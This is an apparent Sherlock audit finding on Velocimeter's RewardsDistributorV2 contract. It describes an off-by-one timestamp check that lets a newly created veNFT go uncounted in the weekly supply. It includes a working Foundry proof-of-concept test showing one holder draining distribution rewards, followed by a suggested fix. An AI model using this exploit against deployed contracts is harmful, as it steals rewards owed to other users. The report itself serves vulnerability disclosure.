Fresh Azure Copperhead

High

# `ve_supply` is updated incorrectly

## Summary
An incorrect time check causes `ve_supply[t]` to be updated incorrectly.
## Vulnerability Detail
When [`RewardsDistributorV2#checkpoint_total_supply‎()`](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/RewardsDistributorV2.sol#L142-L167) is called, the total supply at time `t` will be stored in `ve_supply[t]` for future distribution reward calculations:
```solidity
    function _checkpoint_total_supply() internal {
        address ve = voting_escrow;
        uint t = time_cursor;
        uint rounded_timestamp = block.timestamp / WEEK * WEEK;
        IVotingEscrow(ve).checkpoint();

        for (uint i = 0; i < 20; i++) {
            if (t > rounded_timestamp) {
                break;
            } else {
                uint epoch = _find_timestamp_epoch(ve, t);
                IVotingEscrow.Point memory pt = IVotingEscrow(ve).point_history(epoch);
                int128 dt = 0;
                if (t > pt.ts) {
                    dt = int128(int256(t - pt.ts));
                }
@>              ve_supply[t] = Math.max(uint(int256(pt.bias - pt.slope * dt)), 0);
            }
            t += WEEK;
        }
        time_cursor = t;
    }
```
`ve_supply[t]` should be only updated when `t` week has end (`t + 1 weeks <= block.timestamp`) . However, `ve_supply[t]` could be updated incorrectly when `block.timestamp % 1 weeks` is `0`. If a `veNFT` is created immediately after `checkpoint_total_supply‎()` is called, its balance will not be accounted for in `ve_supply[t]`. A malicious user could exploit this flaw to steal future distribution rewards.

Copy below codes to [RewardsDistributorV2.t.sol](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/test/RewardsDistributorV2.t.sol) and run `forge test --match-test testStealFutureDistributeReward`
```solidity
    function testStealFutureDistributeReward() public {
        initializeVotingEscrow();

        vm.warp((block.timestamp + 1 weeks) / 1 weeks * 1 weeks); 
        minter.update_period();
        //@audit-info malicious can mint a new nft (tokenId == 3) to steal future distribution reward
        flowDaiPair.approve(address(escrow), 2e18);
        escrow.create_lock(2e18,50 weeks);
        //@audit-info 10e18 DAI was deposited into distributor
        DAI.transfer(address(distributor), 10e18);
        vm.warp(block.timestamp + 1 weeks);
        //@audit-info update_period() is called to update  `tokens_per_week`
        minter.update_period();
        //@audit-info the owner of token3 is eligible to claim almost all distribution reward
        assertApproxEqAbs(distributor.claimable(3),  10e18, 0.2e18);
        distributor.claim(3);
        //@audit-info distributor doesn't have enough DAI for token1 to claim
        assertLt(DAI.balanceOf(address(distributor)), 0.2e18);
        assertEq(distributor.claimable(1), 5e18);
        vm.expectRevert();
        distributor.claim(1);
    }
```
## Impact
A malicious user could create a new veNFT to steal future distribution rewards, leaving other eligible users without any rewards to claim.
## Code Snippet
https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/RewardsDistributorV2.sol#L149
## Tool used

Manual Review

## Recommendation
Make sure that `ve_supply[t]` should be only updated when `t` week has end (`t + 1 weeks <= block.timestamp`):
```diff
    function _checkpoint_total_supply() internal {
        address ve = voting_escrow;
        uint t = time_cursor;
        uint rounded_timestamp = block.timestamp / WEEK * WEEK;
        IVotingEscrow(ve).checkpoint();

        for (uint i = 0; i < 20; i++) {
-           if (t > rounded_timestamp) {
+           if (t >= rounded_timestamp) {
                break;
            } else {
                uint epoch = _find_timestamp_epoch(ve, t);
                IVotingEscrow.Point memory pt = IVotingEscrow(ve).point_history(epoch);
                int128 dt = 0;
                if (t > pt.ts) {
                    dt = int128(int256(t - pt.ts));
                }
                ve_supply[t] = Math.max(uint(int256(pt.bias - pt.slope * dt)), 0);
            }
            t += WEEK;
        }
        time_cursor = t;
    }
```